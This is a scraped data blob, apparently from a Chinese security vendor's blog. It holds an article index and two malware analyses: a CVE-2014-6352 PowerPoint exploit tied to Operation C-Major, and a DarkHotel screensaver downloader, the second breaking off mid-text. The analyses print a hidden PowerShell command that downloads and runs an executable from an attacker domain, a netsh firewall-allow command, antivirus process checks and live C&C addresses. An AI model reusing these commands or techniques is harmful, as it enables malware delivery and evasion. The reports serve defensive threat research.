APT组织攻击木马分析报告","针对巴基斯坦的某APT活动事件分析","DarkHotel定向攻击样本分析","海莲花重出水面"],articleId:["597733a71c670a09e493ee37","597733a71c670a09e493ee3a","597733a71c670a09e493ee3d","597733a71c670a09e493ee3e","597733a71c670a09e493ee3c"],count:5,tag:"APT"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"暗云"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"暗云3"},{title:["海莲花重出水面"],articleId:["597733a71c670a09e493ee3c"],count:1,tag:"海莲花"},{title:["海莲花重出水面"],articleId:["597733a71c670a09e493ee3c"],count:1,tag:"oceanlotus"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"DarkCloud"},{title:["DarkHotel定向攻击样本分析"],articleId:["597733a71c670a09e493ee3e"],count:1,tag:"DarkHotel"},{title:["针对巴基斯坦的某APT活动事件分析"],articleId:["597733a71c670a09e493ee3d"],count:1,tag:"Pakistan"},{title:["浏览器变造者流氓推广软件分析"],articleId:["597733a71c670a09e493ee3b"],count:1,tag:"adware"},{title:["Petya变种勒索蠕虫启动代码分析"],articleId:["597733a71c670a09e493ee40"],count:1,tag:"petya"},{title:["CVE-2014-6352漏洞及定向攻击样本分析"],articleId:["596f0ad74337d4596e59ed0b"],count:1,tag:"CVE-2014-6352"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"Office"},{title:["Gaza Cybergang APT团伙新样本分析"],articleId:["597733a71c670a09e493ee37"],count:1,tag:"gaza"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"docx"},{title:["Petya变种勒索蠕虫启动代码分析"],articleId:["597733a71c670a09e493ee40"],count:1,tag:"mbr"},{title:["WannaCry勒索蠕虫：过程、后果及反思"],articleId:["598307456fa1a61d9d267dc8"],count:1,tag:"WannaCry"},{title:["H-WORM：简单而活跃的远控木马"],articleId:["597733a71c670a09e493ee39"],count:1,tag:"HWorm"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"template injection"},{title:["FIN7 APT组织攻击木马分析报告"],articleId:["597733a71c670a09e493ee3a"],count:1,tag:"Fin7"},{title:["WannaCry勒索蠕虫：过程、后果及反思"],articleId:["598307456fa1a61d9d267dc8"],count:1,tag:"Ransom"},{title:["FIN7 APT组织攻击木马分析报告"],articleId:["597733a71c670a09e493ee3a"],count:1,tag:"Backdoor"},{title:["浏览器变造者流氓推广软件分析"],articleId:["597733a71c670a09e493ee3b"],count:1,tag:"FireBall"}],[{category:"全部"},{title:["CVE-2014-6352漏洞及定向攻击样本分析","Gaza Cybergang APT团伙新样本分析","FIN7 APT组织攻击木马分析报告","浏览器变造者流氓推广软件分析","针对巴基斯坦的某APT活动事件分析","DarkHotel定向攻击样本分析","海莲花重出水面","暗云III木马技术分析报告","Petya变种勒索蠕虫启动代码分析","WannaCry勒索蠕虫：过程、后果及反思"],articleId:["596f0ad74337d4596e59ed0b","597733a71c670a09e493ee37","597733a71c670a09e493ee3a","597733a71c670a09e493ee3b","597733a71c670a09e493ee3d","597733a71c670a09e493ee3e","597733a71c670a09e493ee3c","597733a71c670a09e493ee3f","597733a71c670a09e493ee40","598307456fa1a61d9d267dc8"],count:10,category:"事件追踪"},{title:["H-WORM：简单而活跃的远控木马"],articleId:["597733a71c670a09e493ee39"],count:1,category:"技术研究"},{title:["威胁情报的层次分析"],articleId:["597733a71c670a09e493ee38"],count:1,category:"安全观点"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,category:"专题报告"}],{success:!0,msg:[{_id:"596f0ad74337d4596e59ed0b",title:"CVE-2014-6352漏洞及定向攻击样本分析",category:"事件追踪",readableId:"CVE-2014-6352-and-targeted-attack-sample",abstract:"近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。",author:"黄朝文",headImg:"/uploads/2017/08/17/13296b2306bed22900c8f2ffd7d3242a.png",descImg:"/uploads/2017/08/01/847ba7154379f2cd5d13599b5f1023bf.png",tags:["CVE-2014-6352"],publish_time:"2016-06-15T10:13:24.000Z",content:'<h2 class="line" data-line="0">引子</h2>\n<p class="line" data-line="3">人在做，天在看。</p>\n<p class="line" data-line="5">近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。</p>\n<p class="line" data-line="7">本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。</p>\n<h2 class="line" data-line="9">漏洞分析</h2>\n<p class="line" data-line="12">样本利用的漏洞为CVE-2014-6352，该漏洞是CVE-2014-4114的补丁绕过（MS14-060）问题,在管理员模式或者关闭UAC的情况下可以实现不弹出警告窗运行嵌入的恶意程序。与CVE-2014-4114的利用样本相比，CVE-2014-6352样本的特点是没有嵌入inf，只有一个嵌入PE的OLE对象。从攻击者的角度看，这类样本可以说有利有弊。在管理员模式下，可以无警告窗执行PE文件，绕开MS14-060的补丁。但是如果不是在管理员模式下，就算受害者没有安装MS14-060的补丁，也会弹窗提示是否要执行嵌入的EXE文件。</p>\n<p class="line" data-line="14">我们知道CVE-2014-4114漏洞的成因在于<code>packager.dll</code>的<code>CPackage::Load</code>方法加载对应的OLE复合文档对象时，对不同类型的复合文档有不同的处理流程，其中对某些复合文档嵌入的不可信来源文件没有经过处理，从而使得攻击者可以通过伪造OLE复合文档的CLSID来达到执行特定文件的效果：</p>\n<p class="text-center line" data-line="16"><img src="/uploads/2017/07/19/f897205ebdd4b539662fd55a38f8764c.png" alt="ec5689a025ca576871fd17473bcbc8c8" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="18"><code>packager!Cpackage:: Load</code>方法中处理不同类型复合文档的分支</p>\n<p class="line" data-line="20">在MS14-060这个补丁中，微软通过添加MarkFileUnsafe函数来弥补这个漏洞：</p>\n<p class="text-center line" data-line="22"><img src="/uploads/2017/07/19/f8526ca329f4febc58d84379d2e857a3.png" alt="17ff0c4e99eedd776dc74c83cd72c86e" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="25">ms14-060补丁中的<code>packager!Cpackage:: EmbedReadFromStream</code>方法</p>\n<p class="text-center line" data-line="27"><img src="/uploads/2017/07/19/500690b9394d10953d84afcfcccecf5c.png" alt="ee2bf9b4ccab377f39d334ff2b4dd703" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="30">未安装ms14-060的<code>packager!Cpackage:: EmbedReadFromStream</code>方法</p>\n<p class="line" data-line="32"><code>MarkFileUnsafe()</code>通过调用<code>IZoneIdentifier::SetId</code>来设置文件的Security Zone，传入的参数3对应的是设置URLZONE_INTERNET，从而标明此文件来自于其他计算机，运行时会弹出警告窗口：</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/19/8f9bade0d68af67a30677e2402f505b1.png" alt="de9349df8bd2c409db5fb768a4e43517" width="70%"></p>\n<p class="text-center line" data-line="36"><img src="/uploads/2017/07/19/f7ac3d0d95fc8757994bc71f1d7b1aa8.png" alt="3849abadc8fa5c51f32251ef06cdfb55" width="55%"></p>\n<p class="line" data-line="38">然而漏洞并不仅仅只是未对不可信来源的文件处理，攻击者还可以通过伪造OLE复合文档的CLSID和XML中的OLE Verb来改变执行流程。问题还在于对一个exe文件来说，即使被标记了URLZONE_INTERNET之后，右键点击以管理员权限运行时，将不会再弹窗提示该文件来自于其他计算机，而是以UAC的提示窗弹出：</p>\n<p class="text-center line" data-line="40"><img src="/uploads/2017/07/19/8e41d3b4d060bdc985a952f701f3338f.png" alt="88ced94789ce38c0e55e572dc208d252" width="60%"></p>\n<p class="line" data-line="42">所以只需要构造特定的CLSID和OLE Verb，使执行流程来到右键界面的第二项管理员权限运行EXE程序，那么在关闭UAC或者管理员权限的情况下，就能绕过MS14-060补丁施加的限制。下面我们结合这次从外面捕获到的样本来展示一下整个漏洞利用的过程。</p>\n<h2 class="line" data-line="44">样本分析</h2>\n<p class="line" data-line="47">首先我们拿到了一个名为vedio.ppsx的PPT文件，MD5为<strong>b6a1ee16de885c70682a7a8e4c1b556c</strong>，从VirusTotal的上传来源看为来自印度。对这个ppsx解压处理，可以看到其内嵌了一个OLE对象，嵌入的是一个PE文件：</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/19/8530294cce4221c3b4b01073411f8feb.png" alt="da510314acac1a35878ca8c501550066" width="70%"></p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/19/71277408e68d7ff10d9133df8c53121b.png" alt="7a789920319ebd01a8111191b8436d07" width="70%"></p>\n<p class="line" data-line="54">在video.ppsx\\ppt\\slides\\slide1.xml中，指定了嵌入的对象<em>id = rId3</em></p>\n<p class="text-center line" data-line="56"><img src="/uploads/2017/07/19/0dad7c0e72148d4bcf5696155bd56afe.png" alt="dd45f53f870504f4cb90c4aeb3216967" width="90%"></p>\n<p class="line" data-line="59">在video.ppsx \\ppt\\slides\\_rels\\ slide1.xml.rels中指定了rId3对应的是前面提到的oleObject1.bin</p>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/19/70bba37c63f251a821b6d85c0b99f089.png" alt="25e8be6c73bc79e942c20ca4ec47d751" width="90%"></p>\n<p class="line" data-line="64">复合文档对应的CLSID如下图，是{0003000c-0000-0000-c000-000000000046}，对应的是<code>CLSID\\_OldPackage</code>，那么根据上面的分析，<code>CPackage::Load</code>调用<code>CPackage::PackageReadFromStream</code>进一步处理，<code>PackageReadFromStream</code>会通过<code>CPackage::EmbedReadFromStream</code>在临时目录释放嵌入的PE文件。</p>\n<p class="text-center line" data-line="66"><img src="/uploads/2017/07/19/3b26fb904b5198daf95db220515432fc.png" alt="bd02c7199b8937e755285c7a94319bab" width="70%"></p>\n<p class="line" data-line="69"><code>packager!CPackage::EmbedReadFromStream</code>中调用了 <code>packager!CopyStreamToFile</code>这个函数，将嵌入的PE释放到temp目录下的putty.exe，并通过MarkFileUnsafe设置文件标记：</p>\n<p class="text-center line" data-line="71"><img src="/uploads/2017/07/19/4d8325c9f5d207023f8dc61d8b3d6084.png" alt="5aa0635ef7f3180fe1db46f7399917fc" width="70%"></p>\n<p class="line" data-line="74">然后，通过<code>CPackage::DoVerb</code>方法来响应终端用户的动作，在 <code>CPackage::DoVerb</code>中，会先对第二个参数进行判断，这个参数在video.ppsx\\ppt\\slides\\slide1.xml中指定：</p>\n<p class="text-center line" data-line="76"><img src="/uploads/2017/07/19/6185b2931696c6e14f0fcb33ed723bdc.png" alt="110e72f2b2d8cc8fb61b1b03d434272b" width="60%"></p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/19/974285891fde33c617e3bf0491c2c9e4.png" alt="84a19910d81ea7d7e44d3b4b02528135" width="50%"></p>\n<p class="line" data-line="80">样本中构造的参数是3，所以进入使用popup菜单命令执行操作的流程：</p>\n<p class="text-center line" data-line="82"><img src="/uploads/2017/07/19/53028b83a41a36a4db703f8136d7728c.png" alt="40cec50bbd6ae2f8051496495b28f10c" width="70%"></p>\n<p class="line" data-line="85">调用GetMenuItemInfo时，第二个参数uItem代表菜单的位置，这里参数为1，也就是右键菜单的第二项，对于exe文件，右键菜单的第二项是“以管理员权限运行”</p>\n<p class="text-center line" data-line="87"><img src="/uploads/2017/07/19/0839a8cf4c88abab33f22ceefcd087b9.png" alt="c63035508e86f51a92ba30eb4923487d" width="70%"></p>\n<p class="line" data-line="90">最终调用了<code>SHELL32!CDefFolderMenu::InvokeCommand</code>方法，这时就会以试图管理员权限运行putty.exe，在关闭了UAC或者管理员模式下，就绕过了MS14-060的保护静默地执行了一个PE文件。</p>\n<h2 class="line" data-line="92">所释放程序的分析</h2>\n<h3 class="line" data-line="95">putty.exe</h3>\n<p class="line" data-line="97">ppt文件释放出来的putty.exe实际上是一个改名后的经过混淆的.NET 程序，MD5为 <strong>78fab9978ae4de4f684908f47fdc2333</strong>，这个程序其实是一个Dropper。</p>\n<p class="line" data-line="99">经过去混淆后，我们可以清楚地看到其程序代码，首先遍历是否有杀软进程：</p>\n<p class="text-center line" data-line="101"><img src="/uploads/2017/07/19/b1424f26361cd612bea23097ac9ebdd5.png" alt="6288c40a99e15e50f60403cd645fdf7b" width="70%"></p>\n<p class="line" data-line="104">样本在这里其实不是一次遍历查找，而是分成多次遍历穿插在功能代码中，每次查找一到两款杀软的进程，查找的杀软进程如下：</p>\n<ul>\n<li>ekrn.exe（ESET）</li>\n<li>guardxkickoff.exe（IKARUS）</li>\n<li>AvastSvc.exe</li>\n<li>btagent.exe</li>\n<li>bdagent.exe（BitDefender）</li>\n<li>avgui.exe。</li>\n</ul>\n<p class="line" data-line="113">然后从资源中读取数据，并解密为一个PE文件</p>\n<p class="text-center line" data-line="115"><img src="/uploads/2017/07/19/8d14516bf5fda74c4fda4048d187393a.png" alt="fd4d12799d8a7d3ba57780053606e0e0" width="70%"></p>\n<p class="line" data-line="118">启动cmd进程，将自身拷贝成%temp%\\net\\health.exe并添加注册表启动项</p>\n<p class="text-center line" data-line="120"><img src="/uploads/2017/07/19/e2c5fbd89afc5af31fd936983addb09f.png" alt="d755d300218b7dddee8b99a2b22a18ca" width="90%"></p>\n<p class="text-center line" data-line="122"><img src="/uploads/2017/07/19/6406e44c2341468d55b1008d4a45c344.png" alt="25119ad65db1a5d422c56f97cf33fdbb" width="90%"></p>\n<p class="line" data-line="125"><strong>HKEY_CURRENT_USER/Software/Microsoft/Windows NT/CurrentVersion/Windows - load</strong> 这个值可以指定在用户登录后自动运行的程序文件名。</p>\n<p class="line" data-line="127">然后将RegAsm.exe拷贝为%temp%\\svhost.exe</p>\n<p class="text-center line" data-line="129"><img src="/uploads/2017/07/19/045a76172ad87b67fb6d983d27bca8aa.png" alt="ed46672de8d53ce473fa7954a269da27" width="40%"></p>\n<p class="text-center line" data-line="131"><img src="/uploads/2017/07/19/fa85671b4f2d25b42a835941e8b1b314.png" alt="9b6440545c9cbff8e32d59cf008fe4b7" width="90%"></p>\n<p class="text-center line" data-line="133"><img src="/uploads/2017/07/19/07c64ae2210d205282d9996758959d27.png" alt="1d3d631a1227c51f472b44367128ab08" width="60%"></p>\n<p class="line" data-line="135">接着以Suspend方式启动svhost.exe，将之前解密出来的PE注入，并恢复线程。</p>\n<p class="text-center line" data-line="137"><img src="/uploads/2017/07/19/ba0c7e440408f7d03148d03e952bfeab.png" alt="7f38dd2a4d4f4cdd659319f1af2c5e62" width="90%"></p>\n<p class="line" data-line="139">最后在%temp%/net/目录下写入health.exe.bat文件并执行</p>\n<p class="text-center line" data-line="141"><img src="/uploads/2017/07/19/5c48658f739e268d990f44b2b8c62f60.png" alt="835aae11f4e76320611b52eb98d3d1d2" width="80%"></p>\n<p class="line" data-line="143">health.exe.bat的代码如下，作用是不断遍历进程查看svhost.exe是否启动，没有启动的话则将其启动。</p>\n<p class="text-center line" data-line="145"><img src="/uploads/2017/07/19/26b6d8ff104be4f22a048131f4d481cd.png" alt="7da28826361240a37f148a685e5ab563" width="80%"></p>\n<h3 class="line" data-line="147">svhost.exe</h3>\n<p class="line" data-line="149">在HKEY_CURRENT_USER中设置一个值di用于判断是否已经感染过该系统：</p>\n<p class="text-center line" data-line="151"><img src="/uploads/2017/07/19/addb5d89a982f492bf7b89a19ad98a82.png" alt="c95ebff2497c18d2b3bb4b9710c9049d" width="70%"></p>\n<p class="line" data-line="153">设置HKEY_CURRENT_USER\\Environment\\SEE_MASK_NOZONECHECKS的值为1，这是用于关闭附件管理器检查的：</p>\n<p class="text-center line" data-line="155"><img src="/uploads/2017/07/19/5b53e06d0749114811dc105474a0b25b.png" alt="7ddf63a334a55426403ccf7796ed9ac4" width="90%"></p>\n<p class="line" data-line="157">然后用命令行启动netsh.exe，添加防火墙规则，允许其通过防火墙</p>\n<p class="text-center line" data-line="159"><img src="/uploads/2017/07/19/a24b4030f205e25bd7786d5c801195c7.png" alt="11cf4fcbdcc9843135ccf3501f432f78" width="70%"></p>\n<p class="line" data-line="161">命令行如下</p>\n<pre class="hljs"><code class="hljs">netsh firewall add allowedprogram "C:\\\\Users\\\\\\*\\*\\*\\\\AppData\\\\Local\\\\Temp\\\\svhost.exe" " svhost.exe" ENABLE\n</code></pre>\n<p class="line" data-line="166">申请一片内存空间用于存放接收/发送的数据，开始网络连接：</p>\n<p class="text-center line" data-line="168"><img src="/uploads/2017/07/19/9676a58a7a0286760d7efe01716f8b8d.png" alt="2b352c13dc65a30c5a89e3e58b7e5cd1" width="85%"></p>\n<p class="line" data-line="170">C&amp;C地址： 191.101.23.190</p>\n<p class="text-center line" data-line="172"><img src="/uploads/2017/07/19/7af893eca785ff862aee5afbac77b95b.png" alt="d0e210eb3f1849905b921d248fec11dd" width="45%"></p>\n<p class="line" data-line="174">端口号： 5552</p>\n<p class="text-center line" data-line="176"><img src="/uploads/2017/07/19/9bc5294feb1eba985a19966856852ebd.png" alt="3ee54e4519c9871e67dc2e902f0f5158" width="45%"></p>\n<p class="line" data-line="178">收集受害者的系统信息，包括上线时间、系统版本、系统位数、磁盘信息、当前用户等等，并发送出去：</p>\n<p class="text-center line" data-line="180"><img src="/uploads/2017/07/19/6d0d740ce86a5be474a38e095a07958b.png" alt="b34f35ad7c8977ff9ef8112311810416" width="90%"></p>\n<p class="line" data-line="182">然后开启一个线程循环查询socket是否可读（接收命令）：</p>\n<p class="text-center line" data-line="184"><img src="/uploads/2017/07/19/6f86f185399a40ecfcaafc97da288f3d.png" alt="64a74da6585d5361b5e420fd66de70a5" width="70%"></p>\n<p class="line" data-line="186">读取命令后，开启新线程根据指令执行对应的操作：</p>\n<p class="text-center line" data-line="188"><img src="/uploads/2017/07/19/425702e46d852ad1355b76207ab5f7fb.png" alt="6a52e6ba30f4ef0bce214db10ae90dae" width="90%"></p>\n<p class="line" data-line="190">开启键盘记录线程，并将记录信息保存在注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707中：</p>\n<p class="text-center line" data-line="192"><img src="/uploads/2017/07/19/b40472dad950a9b67f100bbfdace23fe.png" alt="a717d59135d644202bedebcc6412c553" width="90%"></p>\n<p class="text-center line" data-line="194"><img src="/uploads/2017/07/19/500e126afffb6afb4d141341145f9512.png" alt="80b41258aea92eb0ca1b83e446a900bf" width="90%"></p>\n<p class="line" data-line="196">设置自启动项：</p>\n<p class="text-center line" data-line="198"><img src="/uploads/2017/07/19/109deec3d382e38db502a2043da04b0c.png" alt="65ff19f29e11e13e3178dcf40a1416fb" width="90%"></p>\n<p class="text-center line" data-line="201"><img src="/uploads/2017/07/19/7fbf79d02308fa3ea4b0b3868cefcf89.png" alt="601e1a90b302e8c0c9989aafe7f95cb4" width="90%"></p>\n<p class="line" data-line="203">接收命令后，对命令做出相应的处理，在switch中根据命令执行对应的功能，这里就不再详细分析，下面给出部分功能与对应的命令，</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>rn</td>\n<td>下载/执行文件</td>\n</tr>\n<tr>\n<td>CAP</td>\n<td>屏幕监控</td>\n</tr>\n<tr>\n<td>un</td>\n<td>自删除、启动和终止进程</td>\n</tr>\n<tr>\n<td>up</td>\n<td>在线更新</td>\n</tr>\n<tr>\n<td>Ex</td>\n<td>加载插件</td>\n</tr>\n<tr>\n<td>GTV</td>\n<td>获取注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707中的键盘记录信息</td>\n</tr>\n<tr>\n<td>STV</td>\n<td>设置注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707开始键盘记录</td>\n</tr>\n<tr>\n<td>…..</td>\n<td>……</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="216">IOC</h2>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>C&amp;C</td>\n<td>191.101.23.190:5552</td>\n</tr>\n<tr>\n<td>Downloader URL</td>\n<td>http://pcdopune.com/ad/video.ppsx</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="224">总结</h2>\n<p class="line" data-line="227">在网上公开的IOC平台中发现，该C&amp;C地址与趋势科技在今年三月份发布的“Operation C-Major”报告中的一个C&amp;C完全一致。另外，样本下载的域名pcdopune.com关联到的其他样本中，也出现了与报告中几乎一样的恶意宏样本，由此我们认为这是与C-Major相关的攻击行动。</p>\n<p class="line" data-line="229">根据360威胁情报中心的数据，我们发现本文所涉及的样本仅仅只是C-Major行动中使用的多种Dropper中的一种类型，CVE-2010-3333、CVE-2012-0158等漏洞也被利用来做恶意代码的植入，不仅如此，甚至还利用了宏和脚本，所使用的PE样本更是灵活多变。从这些迹象来看C-Major行动背后团伙非常积极地利用所能得到各种植入手段，极有可能是专业的有背景及一定技术能力的组织。</p>\n<h2 class="line" data-line="231">参考链接</h2>\n<p class="line" data-line="234"><a href="http://documents.trendmicro.com/assets/pdf/Indian-military-personnel-targeted-by-information-theft-campaign-cmajor.pdf"><em>http://documents.trendmicro.com/assets/pdf/Indian-military-personnel-targeted-by-information-theft-campaign-cmajor.pdf</em></a></p>\n<p class="line" data-line="236"><a href="http://www.cnblogs.com/Danny-Wei/p/4161539.html"><em>http://www.cnblogs.com/Danny-Wei/p/4161539.html</em></a></p>\n<p class="line" data-line="238"><a href="http://www.openoffice.org/sc/compdocfileformat.pdf"><em>http://www.openoffice.org/sc/compdocfileformat.pdf</em></a></p>\n'},{_id:"597733a71c670a09e493ee3e",title:"DarkHotel定向攻击样本分析",category:"事件追踪",readableId:"darkhotel-targeted-attack-sample-analysis",abstract:"360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。这个团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。",author:"代慧平",headImg:"/uploads/2017/08/17/daee2836562e4dcbddcaaab6ed605466.png",descImg:null,tags:["DarkHotel","APT"],publish_time:"2016-05-13T19:25:41.000Z",content:'<h2 class="line" data-line="0">引言</h2>\n<p class="line" data-line="2">人在做，天在看。</p>\n<p class="line" data-line="4">360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。</p>\n<p class="text-center line" data-line="6"><img src="/uploads/2017/07/25/b94e98a75d80901569781b7706c462a3.png" alt="" width="90%"></p>\n<p class="line" data-line="8">DarkHotel团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。</p>\n<h2 class="line" data-line="10">样本分析</h2>\n<h3 class="line" data-line="12">基本信息</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>样本MD5</strong></td>\n<td>43f3b56c1c01b007c35197c703e4d6a6</td>\n</tr>\n<tr>\n<td><strong>样本大小</strong></td>\n<td>131,072 Bytes</td>\n</tr>\n<tr>\n<td><strong>编译时间</strong></td>\n<td>2015-10-15  22:52:30</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>DSC3013.JPG.scr</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="23">样本截图：</p>\n<p class="text-center line" data-line="25"><img src="/uploads/2017/07/25/00bdf6b50ed64629185aa0f4c0af9b49.png" alt="" width="90%"></p>\n<h3 class="line" data-line="27">详细行为</h3>\n<p class="line" data-line="29">总体来说，样本的功能很简单，是一个典型的下载器诱饵。得到点击运行机会以后，样本会从自身释放3个图片和1个快捷方式到TEMP目录下；调用mspaint打开3个图片中的一个文件，执行TEMP目录下的快捷方式，快捷方式运行起来后会启动powershell从<code>http://all-microsoft-control.com/kd/f.exe</code>下载PE并执行。</p>\n<p class="line" data-line="31">样本首先会获取TEMP目录的路径：</p>\n<p class="text-center line" data-line="33"><img src="/uploads/2017/07/25/115b3d5f8c7da4f3b907e8ac19dd4104.png" alt=""></p>\n<p class="line" data-line="35">然后拼出4个路径：</p>\n<ul>\n<li>\n<p>%temp%\\DSC3013.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3014.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3015.JPG</p>\n</li>\n<li>\n<p>%temp%\\desktop.lnk</p>\n</li>\n</ul>\n<p class="text-center line" data-line="45"><img src="/uploads/2017/07/25/6069b840d7398d5f48154c2d40cac2ae.png" alt="" width="90%"></p>\n<p class="line" data-line="47">会从自身文件的0x406b20的偏移处读取0xead字节的数据写入到DSC3013.JPG、DSC3014.JPG和DSC3015.JPG文件中；</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/25/0bbb522a245a8fbbc734d4a54a8535ba.png" alt="" width="90%"></p>\n<p class="line" data-line="51">数据为JPG图片格式文件，如图：</p>\n<p class="text-center line" data-line="53"><img src="/uploads/2017/07/25/acba031979dbc593e8dc49992c70318a.png" alt="" width="90%"></p>\n<p class="line" data-line="55">图片是纯白色背景的JPG文件，因为这种纯色文件通过JPG格式的压缩后占用的空间比较小。</p>\n<p class="text-center line" data-line="57"><img src="/uploads/2017/07/25/8569fdab5bafba66d82202502ae7230c.png" alt="" width="90%"></p>\n<p class="line" data-line="59">数据同时写入到刚才创建的3个隐藏的图片文件中，CreateFile的倒数第二个参数为2，表示该文件是隐藏的状态。</p>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/25/fdcc62d03d69a9d1484e7505198ed139.png" alt="" width="90%"></p>\n<p class="line" data-line="63">之后会调用mspaint.exe打开DSC3013.jpg文件，因为木马样本的文件名为DSC3013.JPG.scr，而且木马样本也是图片图标，所以用图片打开DSC3013.jpg文件迷惑受害者:</p>\n<p class="text-center line" data-line="65"><img src="/uploads/2017/07/25/61dfbe5f493472fca4433423ce0868ed.png" alt="" width="90%"></p>\n<p class="line" data-line="67">接下来会在同目录下再创建3个不隐藏的图片文件，并写入同样的数据：</p>\n<p class="text-center line" data-line="69"><img src="/uploads/2017/07/25/45f814441f410f839b2add1ffde8d73f.png" alt="" width="90%"></p>\n<p class="line" data-line="71">然后创建隐藏的desktop.lnk文件，把从文件的0x406088 处读取到的数据写入到该文件，并通过ShellExecute运行起来该快捷方式文件：</p>\n<p class="text-center line" data-line="73"><img src="/uploads/2017/07/25/767b77b1e45f1b449a46e065cdcff29b.png" alt="" width="90%"></p>\n<p class="line" data-line="75">文件的0x406088偏移处是一个快捷方式格式的文件，如图能看到快捷方式的参数信息：</p>\n<p class="text-center line" data-line="77"><img src="/uploads/2017/07/25/8517464a5af5bdb701d80b6453373bf9.png" alt="" width="90%"></p>\n<p class="line" data-line="79">把该块数据段保存成LNK文件，命令行参数如下：</p>\n<p class="text-center line" data-line="81"><img src="/uploads/2017/07/25/928be2ad6fc6d2623f0d6a4c16b4350b.png" alt=""></p>\n<p class="line" data-line="83">快捷方式指向的目标为：</p>\n<pre class="hljs"><code class="hljs">%COMSPEC% /c powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://all-microsoft-control.com/kd/f.exe \',\'%temp%\\~$ER96F\\.doc\')&&echo f|xcopy %temp%\\~$ER96F.doc %temp%\\dwm.exe /H /Y&&%temp%\\dwm.exe\n</code></pre>\n<p class="line" data-line="89">所以快捷方式被执行起来后，会调用powershell从http://all-microsoft-control.com/kd/f.exe下载到%temp%\\~$ER96F.doc，并把该文件重命名为dwm.exe后，运行起来。</p>\n<p class="line" data-line="91">最后会在同目录下生成desktop.bat，并把“del *.scr\\r\\ndel *.bat”代码写入进去，试图删除掉该目录下所有的scr和bat后缀的文件，让目录看起来只有正常的图片文件。</p>\n<p class="text-center line" data-line="93"><img src="/uploads/2017/07/25/f480320173f2d9f1716f6eb576e37ff1.png" alt="" width="90%"></p>\n<h3 class="line" data-line="95">远控木马</h3>\n<p class="line" data-line="97">目前通过URL下载的dwm.exe已经失效，但从360公司海量的样本库中找到了这个文件不难：</p>\n<p class="text-center line" data-line="99"><img src="/uploads/2017/07/25/9d0ea33a223c2fdebd03a895edf31ceb.png" alt="" width="90%"></p>\n<p class="line" data-line="101">分析显示此dwm.exe是一个使用OpenSSL协议的远控木马：</p>\n<p class="text-center line" data-line="103"><img src="/uploads/2017/07/25/74fcf6804bd22443ceb47358fc021ec2.png" alt="" width="90%"></p>\n<p class="line" data-line="105">样本的字符串加密存储样本里的，关键API都用解密后的字符串动态加载：</p>\n<p class="text-center line" data-line="107"><img src="/uploads/2017/07/25/868677a706a24e956502810888c868cc.png" alt="" width="90%"></p>\n<p class="line" data-line="109">sub_497036是字符串的解密函数：</p>\n<p class="text-center line" data-line="111"><img src="/uploads/2017/07/25/c8f76a42d257ba8817e8b80416c2f570.png" alt=""></p>\n<p class="line" data-line="113">样本会检测虚拟机、沙箱和杀软：</p>\n<p class="line" data-line="115">卡巴</p>\n<p class="text-center line" 